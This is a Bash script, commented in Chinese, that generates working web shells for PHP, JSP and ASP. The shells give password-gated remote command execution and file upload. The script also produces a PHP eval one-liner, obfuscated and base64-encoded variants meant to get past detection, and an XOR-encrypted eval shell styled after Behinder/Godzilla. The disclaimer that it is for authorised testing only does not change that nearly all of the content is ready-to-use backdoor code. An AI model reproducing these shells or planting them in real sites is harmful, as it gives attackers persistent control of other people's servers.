#!/bin/bash
# ============================================================
# webshell.sh - 简单 WebShell 生成器
# 生成 PHP / JSP / ASP 等类型的 WebShell
#
# 免责声明：本脚本仅供学习和授权测试使用。
# 未经授权使用本脚本进行攻击属于违法行为。
# ============================================================

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# 免责声明
echo -e "${RED}==================== 免责声明 ====================${NC}"
echo -e "${RED}本脚本仅供学习和授权渗透测试使用。${NC}"
echo -e "${RED}未经授权使用本脚本进行攻击属于违法行为。${NC}"
echo -e "${RED}================================================${NC}"
echo ""

# 参数
OUTPUT_DIR="/tmp/webshells"
mkdir -p "$OUTPUT_DIR"

echo "========================================"
echo "  WebShell 生成器"
echo "========================================"
echo -e "输出目录: ${YELLOW}$OUTPUT_DIR${NC}"
echo "========================================"
echo ""

# 1. PHP WebShell
generate_php_shell() {
    local output="$1"
    local password="${2:-shell}"
    
    cat > "$output" << 'PHPEOF'
<?php
// 简单 PHP WebShell
// 用法: shell.php?pass=shell&cmd=whoami
// 密码验证
$pass = "shell";
if ($_REQUEST['pass'] !== $pass) {
    die("Access Denied");
}

// 命令执行
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
    exit;
}

// 文件上传
if (isset($_FILES['file'])) {
    $upload_dir = dirname(__FILE__) . "/";
    $upload_file = $upload_dir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
        echo "文件上传成功: " . $upload_file . "<br>";
    } else {
        echo "文件上传失败<br>";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>PHP WebShell</title>
    <style>
        body { background: #222; color: #0f0; font-family: monospace; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
        input[type="text"] { width: 70%; padding: 8px; background: #333; color: #0f0; border: 1px solid #0f0; }
        input[type="submit"] { padding: 8px 20px; background: #0f0; color: #000; border: none; cursor: pointer; }
        pre { background: #111; padding: 10px; border: 1px solid #0f0; }
    </style>
</head>
<body>
    <div class="container">
        <h2>PHP WebShell</h2>
        <form method="GET">
            <input type="hidden" name="pass" value="<?php echo $pass; ?>">
            <input type="text" name="cmd" placeholder="输入命令..." autofocus>
            <input type="submit" value="执行">
        </form>
        <br>
        <h3>文件上传</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="pass" value="<?php echo $pass; ?>">
            <input type="file" name="file">
            <input type="submit" value="上传">
        </form>
        <br>
        <h3>系统信息</h3>
        <pre>
操作系统: <?php echo php_uname(); ?>

PHP版本: <?php echo phpversion(); ?>

当前用户: <?php echo get_current_user(); ?>

当前目录: <?php echo getcwd(); ?>

禁用函数: <?php echo ini_get('disable_functions') ?: '无'; ?>
        </pre>
    </div>
</body>
</html>
PHPEOF

    echo -e "${GREEN}[+] PHP WebShell 已生成: $output${NC}"
}

# 2. PHP 一句话木马
generate_php_one_liner() {
    local output="$1"
    local password="${2:-c}"
    
    # 最基础的一句话
    echo "<?php @eval(\$_POST['$password']); ?>" > "$output"
    echo -e "${GREEN}[+] PHP 一句话木马已生成: $output${NC}"
    echo "    密码: $password"
    
    # 混淆版本
    local obfuscated="$OUTPUT_DIR/shell_obf.php"
    cat > "$obfuscated" << 'OBFEOF'
<?php
// 混淆版一句话
$a = str_replace("x","","axsxxsxexrxxt");
$b = $_POST['c'];
@$a($b);
?>
OBFEOF
    echo -e "${GREEN}[+] PHP 混淆版: $obfuscated${NC}"
    
    # Base64 编码版
    local b64_shell="<?php @eval(\$_POST['c']); ?>"
    local encoded=$(echo -n "$b64_shell" | base64 -w 0 2>/dev/null)
    if [ -n "$encoded" ]; then
        echo "<?php eval(base64_decode('$encoded')); ?>" > "$OUTPUT_DIR/shell_b64.php"
        echo -e "${GREEN}[+] PHP Base64版: $OUTPUT_DIR/shell_b64.php${NC}"
    fi
}

# 3. JSP WebShell
generate_jsp_shell() {
    local output="$1"
    local password="${2:-shell}"
    
    cat > "$output" << 'JSPEOF'
<%@ page import="java.util.*,java.io.*"%>
<%
// JSP WebShell
// 密码验证
String pass = "shell";
String inputPass = request.getParameter("pass");
if (inputPass == null || !inputPass.equals(pass)) {
    out.println("Access Denied");
    return;
}

// 命令执行
String cmd = request.getParameter("cmd");
if (cmd != null && !cmd.isEmpty()) {
    out.println("<pre>");
    try {
        Process p = Runtime.getRuntime().exec(cmd);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line);
        }
        br.close();
    } catch (Exception e) {
        out.println("Error: " + e.getMessage());
    }
    out.println("</pre>");
}
%>
<!DOCTYPE html>
<html>
<head>
    <title>JSP WebShell</title>
    <style>
        body { background: #222; color: #0f0; font-family: monospace; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
        input[type="text"] { width: 70%; padding: 8px; background: #333; color: #0f0; border: 1px solid #0f0; }
        input[type="submit"] { padding: 8px 20px; background: #0f0; color: #000; border: none; cursor: pointer; }
        pre { background: #111; padding: 10px; border: 1px solid #0f0; }
    </style>
</head>
<body>
    <div class="container">
        <h2>JSP WebShell</h2>
        <form method="GET">
            <input type="hidden" name="pass" value="<%= pass %>">
            <input type="text" name="cmd" placeholder="输入命令..." autofocus>
            <input type="submit" value="执行">
        </form>
        <br>
        <h3>系统信息</h3>
        <pre>
操作系统: <%= System.getProperty("os.name") %>
操作系统版本: <%= System.getProperty("os.version") %>
Java版本: <%= System.getProperty("java.version") %>
当前用户: <%= System.getProperty("user.name") %>
当前目录: <%= System.getProperty("user.dir") %>
        </pre>
    </div>
</body>
</html>
JSPEOF

    echo -e "${GREEN}[+] JSP WebShell 已生成: $output${NC}"
}

# 4. ASP WebShell
generate_asp_shell() {
    local output="$1"
    local password="${2:-shell}"
    
    cat > "$output" << 'ASPEOF'
<%
' ASP WebShell
Dim pass, inputPass, cmd, shell, output

pass = "shell"
inputPass = Request("pass")

If inputPass <> pass Then
    Response.Write "Access Denied"
    Response.End
End If

cmd = Request("cmd")
If cmd <> "" Then
    Set shell = Server.CreateObject("WScript.Shell")
    Set exec = shell.Exec("cmd /c " & cmd)
    output = exec.StdOut.ReadAll()
    Response.Write "<pre>" & Server.HTMLEncode(output) & "</pre>"
End If
%>
<!DOCTYPE html>
<html>
<head>
    <title>ASP WebShell</title>
    <style>
        body { background: #222; color: #0f0; font-family: monospace; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
        input[type="text"] { width: 70%; padding: 8px; background: #333; color: #0f0; border: 1px solid #0f0; }
        input[type="submit"] { padding: 8px 20px; background: #0f0; color: #000; border: none; cursor: pointer; }
        pre { background: #111; padding: 10px; border: 1px solid #0f0; }
    </style>
</head>
<body>
    <div class="container">
        <h2>ASP WebShell</h2>
        <form method="POST">
            <input type="hidden" name="pass" value="<%= pass %>">
            <input type="text" name="cmd" placeholder="输入命令..." autofocus>
            <input type="submit" value="执行">
        </form>
    </div>
</body>
</html>
ASPEOF

    echo -e "${GREEN}[+] ASP WebShell 已生成: $output${NC}"
}

# 5. 冰蝎/哥斯拉风格的加密 Shell (示例)
generate_encrypted_shell() {
    local output="$1"
    
    cat > "$output" << 'ENC'
<?php
// 加密通信 WebShell 示例
// 使用 AES 加密通信，需要配合客户端使用
// 密码: rebeyond

@error_reporting(0);
session_start();

$key = "e45e329feb5d925b"; // 密钥前16位

// 解密输入
if (isset($_POST['pass'])) {
    $data = base64_decode($_POST['pass']);
    // 简单 XOR 解密示例
    $out = '';
    for ($i = 0; $i < strlen($data); $i++) {
        $out .= $data[$i] ^ $key[$i % strlen($key)];
    }
    // 执行
    ob_start();
    eval($out);
    $result = ob_get_clean();
    // 加密输出
    $out_data = '';
    for ($i = 0; $i < strlen($result); $i++) {
        $out_data .= $result[$i] ^ $key[$i % strlen($key)];
    }
    echo base64_encode($out_data);
}
?>
ENC

    echo -e "${GREEN}[+] 加密通信 Shell 已生成: $output${NC}"
}

# 主菜单
echo "正在生成各类 WebShell..."
echo ""

generate_php_shell "$OUTPUT_DIR/shell.php" "shell"
generate_php_one_liner "$OUTPUT_DIR/one_liner.php" "c"
generate_jsp_shell "$OUTPUT_DIR/shell.jsp" "shell"
generate_asp_shell "$OUTPUT_DIR/shell.asp" "shell"
generate_encrypted_shell "$OUTPUT_DIR/encrypted.php"

echo ""
echo "========================================"
echo -e "  生成完成！所有文件保存在:"
echo -e "  ${GREEN}$OUTPUT_DIR${NC}"
echo "========================================"
echo ""

echo "文件列表:"
ls -la "$OUTPUT_DIR" 2>/dev/null | tail -n +4

echo ""
echo -e "${YELLOW}请仅在授权环境中使用${NC}"
